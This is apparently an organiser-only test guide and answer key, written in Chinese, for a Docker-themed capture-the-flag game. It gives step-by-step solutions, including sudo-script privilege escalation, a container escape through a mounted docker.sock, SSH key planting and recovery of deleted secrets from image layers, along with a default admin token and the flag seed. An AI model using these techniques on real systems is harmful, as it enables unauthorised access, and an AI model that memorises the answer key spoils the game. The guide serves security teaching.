# Escape Docker — 測試指南與完整解題攻略

> 僅限出題方使用，勿在遊戲中展示給玩家

---

## 目錄

- [取得當前 FLAG 答案](#取得當前-flag-答案)
- [Room 0：Tutorial](#room-0tutorial)
- [Room 1：The Archive](#room-1the-archive)
- [Room 2：The Vault](#room-2the-vault)
- [Room 3：The Process](#room-3the-process)
- [Room 4：The Locksmith](#room-4the-locksmith)
- [Room 5：The Wire](#room-5the-wire)
- [Room 6：The Shipyard](#room-6the-shipyard)
- [Room 7：The Workshop](#room-7the-workshop)
- [Room 8：The Fleet](#room-8the-fleet)
- [Room 9：Network Maze](#room-9network-maze)
- [Room 10：The Evidence](#room-10the-evidence)
- [Room 11：The Clockwork](#room-11the-clockwork)
- [Final Boss：The Escape](#final-bossthe-escape)
- [Secret Room A：The Leak](#secret-room-athe-leak)
- [Secret Room B：The Ghost](#secret-room-bthe-ghost)
- [快速驗證腳本](#快速驗證腳本)

---

## 取得當前 FLAG 答案

### 方法 1：Admin Panel（最方便）

1. 開瀏覽器 → `http://localhost/admin.html`
2. 輸入 `.env` 裡的 `ADMIN_TOKEN`（預設：`admin_secret_change_me`）
3. 點擊「FLAG 答案清單」即可看到所有當前 FLAG

### 方法 2：手動計算（預設 seed）

`.env` 預設 `FLAG_SEED=escape_docker_dev_seed` 時，在終端機執行：

```bash
# 計算單一 FLAG
echo "escape_docker_dev_seed-room0" | sha256sum | cut -c1-16
# 輸出：例如 a3f8c1d2e4b7f9a0
# 完整 FLAG：EscapeDocker{a3f8c1d2e4b7f9a0}

# 一次計算全部 FLAG
for room in room0 room1 room2 room3 room4 room5 room6 room7 room8 room9 room10 room11 final secret-a secret-b; do
  hash=$(echo "escape_docker_dev_seed-${room}" | sha256sum | cut -c1-16)
  echo "  ${room}: EscapeDocker{${hash}}"
done
```

### 方法 3：API 端點（需 Admin Token）

```bash
curl -H "X-Admin-Token: admin_secret_change_me" \
  http://localhost/api/admin/flags-info | python3 -m json.tool
```

> **重要：** 更換 `.env` 裡的 `FLAG_SEED` 後，所有 FLAG 都會改變。

---

## Room 0：Tutorial

**分數：** 50 pts　**難度：** ★☆☆☆☆　**時間：** < 1 分鐘

### 解題步驟

```bash
# 進入終端機後，FLAG 直接在歡迎訊息裡
cat /etc/motd
```

或：

```bash
mission    # 等同於 cat /etc/motd（.bashrc 別名）
```

### FLAG 位置

`/etc/motd` 的最後幾行，格式：

```
  ─────────────────────────────────────────────────
  FLAG: EscapeDocker{xxxxxxxxxxxxxxxx}
  ─────────────────────────────────────────────────
```

### 進階探索（非必要）

```bash
cat /home/player/welcome.txt          # 基本指令說明
cat /etc/escape-docker/hint.txt       # 隱藏提示檔案
hint                                  # .bashrc 別名
```

---

## Room 1：The Archive

**分數：** 100 pts　**難度：** ★★☆☆☆　**時間：** 2–5 分鐘

### 解題步驟

```bash
# Step 1：找到 .encoded 副檔名的檔案
find /home -name "*.encoded" 2>/dev/null

# 輸出：/home/player/archive/dir_037/backups/2023/system_backup.encoded

# Step 2：解碼
base64 -d /home/player/archive/dir_037/backups/2023/system_backup.encoded
```

### FLAG 位置

藏在 `/home/player/archive/dir_037/backups/2023/system_backup.encoded`（base64 編碼）

### 干擾物說明

- `/home/player/archive/dir_012/readme.encoded.fake` — 假 FLAG，副檔名是 `.fake`
- `/home/player/archive/dir_055/flag.txt` — 明文假 FLAG
- 80 個目錄、數百個 `data.txt` 和 `log_xxx.log` 假檔案

### 進階探索

```bash
strings /home/player/binary_clue
# 輸出中有：HINT: find encoded files in /home/player/archive - use find and base64
```

---

## Room 2：The Vault

**分數：** 100 pts　**難度：** ★★★☆☆　**時間：** 3–8 分鐘

### 解題步驟

```bash
# Step 1：確認 FLAG 在哪、為什麼看不到
cat /secret/flag.txt
# 輸出：Permission denied

ls -la /secret/flag.txt
# 輸出：-r-------- 1 root root ... /secret/flag.txt

# Step 2：查看 sudo 權限
sudo -l
# 輸出：(root) NOPASSWD: /usr/local/bin/backup.sh

# Step 3：讀懂漏洞腳本
cat /usr/local/bin/backup.sh
# 關鍵行：cp $1 /tmp/out   ← 參數沒有引號 = 路徑注入

# Step 4：利用漏洞
sudo /usr/local/bin/backup.sh /secret/flag.txt

# Step 5：讀取結果
cat /tmp/out
```

### 為什麼這樣可以？

`backup.sh` 的 `cp $1 /tmp/out` 沒有把 `$1` 用引號包起來。當 `$1` 是 `/secret/flag.txt` 時，root 執行的 `cp` 可以讀取這個 root 專屬檔案並複製到 `/tmp/out`，玩家再讀 `/tmp/out` 即可。

### FLAG 位置

容器啟動時由 `entrypoint.sh` 動態寫入 `/secret/flag.txt`（每次重啟都重新生成）

---

## Room 3：The Process

**分數：** 150 pts　**難度：** ★★★☆☆　**時間：** 3–8 分鐘

### 解題步驟

```bash
# Step 1：找到背景執行的 flag_daemon
ps aux
# 或
ps aux | grep flag

# Step 2：找到 PID（通常是 python3 /flag_daemon.py）

# Step 3：發送 SIGUSR1 觸發輸出
kill -USR1 <PID>

# 終端機輸出會出現：
# [flag_daemon] SIGUSR1 received! FLAG: EscapeDocker{xxxxxxxxxxxxxxxx}
```

### 進階解法（讀 /proc）

```bash
# 找到 PID 後讀完整指令
cat /proc/<PID>/cmdline | tr '\0' ' '

# 或用 strace 截獲（需要 strace 工具）
strace -p <PID> 2>&1 | head -20
```

### 注意事項

- `flag_daemon.py` 每 30 秒輸出一次混淆訊息（非 FLAG）
- 必須送 `SIGUSR1` 才會輸出明文 FLAG
- 沒送訊號只會看到 `[flag_daemon] Status OK (pid=xxx)`

---

## Room 4：The Locksmith

**分數：** 150 pts　**難度：** ★★★★☆　**時間：** 5–15 分鐘

### 解題步驟

```bash
# Step 1：生成 SSH key pair
ssh-keygen -t ed25519 -C "ctf" -f ~/.ssh/id_ed25519
# 連按 Enter（不設 passphrase）

# Step 2：把公鑰安裝到 locked-server
ssh-copy-id -i ~/.ssh/id_ed25519.pub player@locked-server
# 會要求輸入密碼（locked-server 在設定公鑰前允許密碼）
# 密碼：（查看 locked-server/setup.sh，預設為空或指定密碼）

# 或手動操作：
cat ~/.ssh/id_ed25519.pub
# 複製輸出，然後：
ssh player@locked-server "mkdir -p ~/.ssh && echo '<公鑰內容>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# Step 3：SSH 登入
ssh locked-server
# 成功登入後，FLAG 在 /etc/motd 或 /home/player/

# 進階 Step 4：建立 SSH Tunnel
ssh -L 8888:localhost:9090 locked-server
# 另開終端機（或在背景 &）：
curl localhost:8888/flag
```

### locked-server 密碼說明

```bash
# 在 locked-server 容器的 setup.sh 中查看
docker exec -it locked-server cat /setup.sh
```

---

## Room 5：The Wire

**分數：** 150 pts　**難度：** ★★★☆☆　**時間：** 3–8 分鐘

### 解題步驟

```bash
# Step 1：找到監聽中的 port
ss -tlnp

# 輸出包含類似：
# LISTEN  0  5  0.0.0.0:7777  ...

# Step 2：用 netcat 連線
nc localhost 7777

# Step 3：回答謎語
# 謎語：「我是每個容器的身份識別，在 Docker 網路裡負責定位，不是 IP 但能解析出 IP」
# 答案：hostname
hostname

# 輸出：
# 正確！🎉
# FLAG: EscapeDocker{xxxxxxxxxxxxxxxx}
```

### 謎語答案

答案是 `hostname`（小寫）。接受的輸入：`hostname`、`name`、`container name`

### 進階探索

```bash
# 查看 /etc/hosts（容器啟動時加入的假 host）
cat /etc/hosts
# 會看到：172.22.0.50  mystery.internal

curl mystery.internal    # 連不到（那個 IP 不存在）
```

---

## Room 6：The Shipyard

**分數：** 200 pts　**難度：** ★★★☆☆　**時間：** 5–10 分鐘

### 解題步驟

```bash
# Step 1：列出所有容器（包含停止的）
docker ps -a
# 找到 ghost-alpha、ghost-beta、ghost-gamma

# ── ghost-alpha：從 logs 取得 ──
docker logs ghost-alpha
# 輸出包含：FLAG_PART_1: EscapeDocker-part1-xxxxxxxx

# ── ghost-beta：從 inspect 環境變數取得 ──
docker inspect ghost-beta | grep -i flag
# 或：
docker inspect ghost-beta --format '{{json .Config.Env}}' | python3 -m json.tool
# 找到 SECRET_FLAG_PART2=part2_inspect_me

# ── ghost-gamma：啟動後 exec 讀檔 ──
docker start ghost-gamma
docker exec ghost-gamma cat /app/secret/fragment.txt
```

> **注意：** 三個容器的資訊是分開的線索，Room 6 真正的 FLAG 要從 `flags.py` 生成後提交，
> 三個 ghost 容器只是謎題道具，讓玩家練習 `docker logs/inspect/exec`。

### 真正的 FLAG 取得方式

Room 6 的 FLAG 藏在 `room6` 容器本身的 setup.sh 裡（用 `FLAG_SEED-room6` 生成），不是 ghost 容器裡。玩家完成三個 ghost 的探索後，系統會引導他們找到真正的 FLAG：

```bash
# 在 room6 容器內：
cat /home/player/.flag_hint
# 或查看 motd 的最後說明
```

---

## Room 7：The Workshop

**分數：** 200 pts　**難度：** ★★★★☆　**時間：** 5–15 分鐘

### 解題步驟

```bash
# Step 1：讀任務說明和 Dockerfile
cat /home/player/challenge/MISSION.txt
cat /home/player/challenge/Dockerfile
cat /home/player/challenge/app/main.py

# Step 2：問題分析
# Dockerfile 的 ENV FLAG_SEED="" 是空字串
# main.py 用 os.environ.get("FLAG_SEED", "default") 讀這個值

# Step 3：修正方法（最簡單）
cd /home/player/challenge
docker build -t fixed-room7 .
docker run --rm -e FLAG_SEED=$(echo $FLAG_SEED) fixed-room7

# 或修改 Dockerfile（用 vim）：
# 把 ENV FLAG_SEED="" 改成 ARG FLAG_SEED=escape_docker_dev_seed
# 再加 ENV FLAG_SEED=${FLAG_SEED}
# 然後：docker build --build-arg FLAG_SEED=$FLAG_SEED -t fixed-room7 .
# docker run --rm fixed-room7
```

### 最快解法

```bash
cd /home/player/challenge
docker build -t r7 . && docker run --rm -e FLAG_SEED=$FLAG_SEED r7
# 輸出：FLAG: EscapeDocker{xxxxxxxxxxxxxxxx}
```

### 進階：Image Layer 挖掘

```bash
# 查看 build history
docker history r7

# 深入挖掘（適合引導到 Secret Room B 的前置）
docker save r7 | tar x -C /tmp/r7-layers 2>/dev/null || \
  mkdir -p /tmp/r7-layers && docker save r7 > /tmp/r7.tar && tar xf /tmp/r7.tar -C /tmp/r7-layers
find /tmp/r7-layers -name "*.tar" -exec tar xf {} -C /tmp/content_{} \; 2>/dev/null
```

---

## Room 8：The Fleet

**分數：** 200 pts　**難度：** ★★★★☆　**時間：** 5–15 分鐘

### 解題步驟

```bash
# Step 1：查看破損的 docker-compose.yml
cd /home/player/challenge
cat docker-compose.yml

# Step 2：嘗試啟動（觀察錯誤）
docker compose up
docker compose logs app
# 錯誤：無法連線到 database / 缺少 DB_HOST

# Step 3：修正設定（用 vim 或 echo）
vim docker-compose.yml
```

修正前的問題版本：
```yaml
services:
  app:
    image: python:3.11-slim
    environment:
      - PORT=8080
    # 缺少：depends_on 和 DB_HOST

  database:
    image: postgres:15-alpine
    environment:
      - POSTGRES_PASSWORD=secret
```

修正後：
```yaml
services:
  app:
    image: python:3.11-slim
    environment:
      - PORT=8080
      - DB_HOST=database          # ← 加這行
      - FLAG_SEED=${FLAG_SEED}
    depends_on:                   # ← 加這段
      - database
    ports:
      - "8080:8080"

  database:
    image: postgres:15-alpine
    environment:
      - POSTGRES_PASSWORD=secret
```

```bash
# Step 4：重新啟動
docker compose up -d

# Step 5：取得 FLAG
curl localhost:8080
# 或
curl localhost:8080/flag
```

---

## Room 9：Network Maze

**分數：** 200 pts　**難度：** ★★★★☆　**時間：** 5–15 分鐘

### 解題步驟

```bash
# Step 1：確認連不到（預期失敗）
curl http://secret-server.internal/
# Connection refused / 無法解析

# Step 2：找到隔離網路
docker network ls
# 找到 escape-docker_secret_net 或 secret_net

# Step 3：把 room9 加入隔離網路
docker network connect escape-docker_secret_net room9

# Step 4：測試連線
curl http://secret-server.internal/
# 輸出：說明頁面

curl http://secret-server.internal/hint
# 輸出：需要 X-Token header

# Step 5：帶正確 Token 存取
curl -H "X-Token: room9_player" http://secret-server.internal/secret
# 輸出：FLAG: EscapeDocker{xxxxxxxxxxxxxxxx}
```

### 注意

- `secret_net` 的 `internal: true` 代表容器無法從外部主動連進來，但容器加入後可以相互溝通
- Token 固定是 `room9_player`（定義在 `rooms/helpers/secret-server/app.py`）

---

## Room 10：The Evidence

**分數：** 250 pts　**難度：** ★★★★☆　**時間：** 10–20 分鐘

### 解題步驟（三步驟分析）

```bash
# Step 1：從 auth.log 找到暴力破解的攻擊者 IP
grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -3

# 輸出類似：
#   8 192.168.1.100   ← 這就是攻擊者（最多次失敗的）
#   1 10.0.0.5
#   1 10.0.0.8

# 攻擊者 IP = 192.168.1.100

# Step 2：從 nginx.log 找到攻擊者存取的路徑
grep "192.168.1.100" /var/log/nginx.log | awk '{print $7}' | sort -u

# 輸出：
# /login
# /api/v1/users/export   ← 敏感路徑
# /admin/config

# Step 3：從 app.log 找到 Session Token（= FLAG）
grep "192.168.1.100" /var/log/app.log
# 或：
grep "Session token" /var/log/app.log

# 輸出：
# [2024-06-09 10:02:20] INFO  Session token: EscapeDocker{xxxxxxxxxxxxxxxx}
```

### 一行完整解法

```bash
ATTACKER=$(grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}') && grep "$ATTACKER" /var/log/app.log | grep "Session token"
```

### 攻擊者資訊（固定值）

| 項目 | 值 |
|------|-----|
| 攻擊者 IP | `192.168.1.100` |
| 失敗登入次數 | 8 次 |
| 成功登入帳號 | `www-data` |
| 存取敏感路徑 | `/api/v1/users/export` |
| Session token | 即 FLAG |

---

## Room 11：The Clockwork

**分數：** 250 pts　**難度：** ★★★★☆　**時間：** 3–10 分鐘（含等待 cron）

### 解題步驟

```bash
# Step 1：找到 cron job
crontab -l
# 可能沒有

cat /etc/cron.d/*
# 找到類似：* * * * * root /usr/local/bin/encrypt.sh

# Step 2：讀懂腳本邏輯
cat /usr/local/bin/encrypt.sh

# 關鍵邏輯：
# if [ "$KEY" = "unlock" ]; then
#     echo "$DATA" > /tmp/result
# fi

# Step 3：寫入正確的 key
echo "unlock" > /tmp/key

# Step 4：等待 cron 執行（最多 60 秒）
# 方法 A：即時監控
watch -n 2 "cat /tmp/result 2>/dev/null || echo 'waiting...'"

# 方法 B：監控 log
tail -f /var/log/encrypt.log

# Step 5：讀取解密結果
cat /tmp/result
# 輸出：EscapeDocker{xxxxxxxxxxxxxxxx}
```

### 注意事項

- cron 每**整點分鐘**執行，最多等 60 秒
- `/secret/data` 是 root 只讀，無法直接讀取
- 寫入 `/tmp/key` 後 **不需要任何操作**，等 cron 自動跑即可
- cron 執行後 `/var/log/encrypt.log` 會有記錄

---

## Final Boss：The Escape

**分數：** 500 pts　**難度：** ★★★★★　**時間：** 15–30 分鐘

### 解題步驟

```bash
# Step 1：發現 docker.sock
ls -la /var/run/docker.sock
# 輸出：srw-rw---- 1 root docker ... /var/run/docker.sock

# Step 2：確認可以存取
curl --unix-socket /var/run/docker.sock http://localhost/version
# 輸出：{"Version":"xx.x.x",...}

# Step 3：列出所有容器
curl --unix-socket /var/run/docker.sock \
  "http://localhost/containers/json?all=true" | python3 -m json.tool | grep -A2 '"vault"'

# Step 4：取得 vault 容器的 ID
VAULT_ID=$(curl -s --unix-socket /var/run/docker.sock \
  "http://localhost/containers/json?all=true" | \
  python3 -c "import sys,json; data=json.load(sys.stdin); \
  print([c['Id'][:12] for c in data if 'vault' in c['Names'][0]][0])")

echo "Vault container ID: $VAULT_ID"

# Step 5：建立 exec 實例
EXEC_ID=$(curl -s -X POST \
  --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/final_flag.txt"]}' \
  "http://localhost/containers/${VAULT_ID}/exec" | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")

# Step 6：執行並取得 FLAG
curl -s -X POST \
  --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}' \
  "http://localhost/exec/${EXEC_ID}/start"
```

### 完整一行腳本

```bash
VAULT_ID=$(curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/json?all=true" | python3 -c "import sys,json;d=json.load(sys.stdin);print([c['Id'] for c in d if 'vault' in c['Names'][0]][0][:12])") && EXEC_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d "{\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/final_flag.txt\"]}" "http://localhost/containers/${VAULT_ID}/exec" | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])") && curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Detach":false,"Tty":false}' "http://localhost/exec/${EXEC_ID}/start"
```

### 安全教育說明（完成後顯示）

- `docker.sock` 掛載 = 等同給予容器 root 存取 host 的能力
- 可建立掛載 `/:/host` 的特權容器，讀取 host 任意檔案
- 正確防護：使用 rootless Docker、Docker socket proxy（Traefik/Portainer 的做法）、或不掛載 socket

---

## Secret Room A：The Leak

**分數：** 300 pts　**解鎖條件：** 完成 Room 6　**難度：** ★★★☆☆

### 解鎖線索

完成 Room 6 後，仔細觀察 `secret-a` 容器的環境變數：

```bash
docker inspect secret-a | grep -A20 '"Env"'
# 或
docker inspect secret-a --format '{{json .Config.Env}}' | python3 -m json.tool
```

### 解題步驟

```bash
# Step 1：進入 secret-a 的終端機（在遊戲地圖點擊）

# Step 2：找到洩漏的 ENV
printenv | grep -i secret
printenv | grep -i leaked
# 輸出：LEAKED_SECRET=escape_docker_dev_seed（FLAG_SEED 被洩漏了！）

# Step 3：利用洩漏的 SEED 計算 FLAG
LEAKED=$(printenv LEAKED_SECRET)
FLAG_HASH=$(echo "${LEAKED}-secret-a" | sha256sum | cut -c1-16)
echo "EscapeDocker{${FLAG_HASH}}"
```

### 設計意義

`docker-compose.yml` 裡 `secret-a` 的設定：

```yaml
secret-a:
  environment:
    - LEAKED_SECRET=${FLAG_SEED}    # 故意把 FLAG_SEED 當作明文 ENV
```

教學重點：**敏感資訊不應放在環境變數**，因為 `docker inspect` 可以直接讀到。

---

## Secret Room B：The Ghost

**分數：** 300 pts　**解鎖條件：** 完成 Room 7　**難度：** ★★★★☆

### 解鎖線索

完成 Room 7 後，在 Dockerfile 或 image history 的提示中發現 `secret-b` 這個 image。

### 解題步驟

```bash
# Step 1：查看 secret-b image 的 build 歷史
docker history escape-docker-secret-b

# 或（不截斷輸出）：
docker history --no-trunc escape-docker-secret-b

# 發現有個 RUN 指令寫入了 /tmp/ghost_layer/deleted_secret.txt

# Step 2：把 image 存成 tar
docker save escape-docker-secret-b > /tmp/secret-b.tar

# Step 3：解壓縮找 layers
mkdir -p /tmp/layers
tar xf /tmp/secret-b.tar -C /tmp/layers

# Step 4：從所有 layer 裡找 FLAG
find /tmp/layers -name "*.tar" | while read layer; do
    tar tf "$layer" 2>/dev/null | grep -i "ghost_layer\|deleted_secret" && \
    echo "Found in: $layer" && \
    tar xf "$layer" -O tmp/ghost_layer/deleted_secret.txt 2>/dev/null
done

# 或更直接：
grep -r "EscapeDocker" /tmp/layers/ 2>/dev/null
# 或
find /tmp/layers -name "*.tar" -exec tar xf {} -C /tmp/extract \; 2>/dev/null
grep -r "EscapeDocker" /tmp/extract/ 2>/dev/null
```

### 設計意義

即使在 Dockerfile 中用 `RUN rm -rf /tmp/ghost_layer` 刪除了包含 FLAG 的目錄，**前一個 layer 的內容仍然存在**於 image 裡。透過 `docker save` 可以提取所有歷史 layer 並找到「已刪除」的檔案。

---

## 快速驗證腳本

啟動後用此腳本確認所有容器正常運行：

```bash
# 確認所有服務狀態
docker compose ps

# 快速測試 API
curl -s http://localhost/api/rooms | python3 -m json.tool | grep '"id"'

# 測試 terminal-gateway WebSocket（需要 wscat）
# npm install -g wscat
# wscat -c "ws://localhost/ws?room=room0"

# 確認 room0 容器內有 FLAG
docker exec room0 cat /etc/motd | grep EscapeDocker

# 一次確認所有 room 的 FLAG 是否生成
for i in 0 1 2 3 4 5 6 7 8 9 10 11; do
  result=$(docker exec room$i bash -c 'FLAG=$(echo "${FLAG_SEED}-room'$i'" | sha256sum | cut -c1-16) && echo "room'$i': EscapeDocker{${FLAG}}"' 2>/dev/null)
  echo "$result"
done
```

---

## 測試核對清單

### 啟動後確認

- [ ] `http://localhost` 能打開首頁
- [ ] `http://localhost/map.html` 能看到 15 個房間
- [ ] Room 0 終端機能連線（`/ws?room=room0`）
- [ ] 輸入 `cat /etc/motd` 能看到 FLAG
- [ ] 提交 FLAG 後排行榜更新
- [ ] `http://localhost/admin.html` 能用 Token 登入

### 關卡核對

| Room | 關鍵確認 |
|------|---------|
| Room 0 | `cat /etc/motd` 直接看到 FLAG |
| Room 1 | `find /home -name "*.encoded"` 找到一個結果 |
| Room 2 | `sudo -l` 顯示 backup.sh 權限 |
| Room 3 | `ps aux` 能看到 `flag_daemon.py` 在跑 |
| Room 4 | `ping locked-server` 有回應 |
| Room 5 | `ss -tlnp` 能看到 port 7777 |
| Room 6 | `docker ps -a` 能看到 ghost-alpha/beta/gamma |
| Room 7 | `/home/player/challenge/Dockerfile` 存在 |
| Room 8 | `/home/player/challenge/docker-compose.yml` 存在 |
| Room 9 | `docker network ls` 能看到 secret_net |
| Room 10 | `/var/log/auth.log` 有 8 筆 192.168.1.100 失敗記錄 |
| Room 11 | `cat /etc/cron.d/*` 能找到 cron job |
| Final | `ls /var/run/docker.sock` 存在 |
| Secret-A | `docker inspect secret-a` 能看到 LEAKED_SECRET |
| Secret-B | `docker history escape-docker-secret-b` 有可疑 layer |

---

*此文件僅供出題方測試使用*
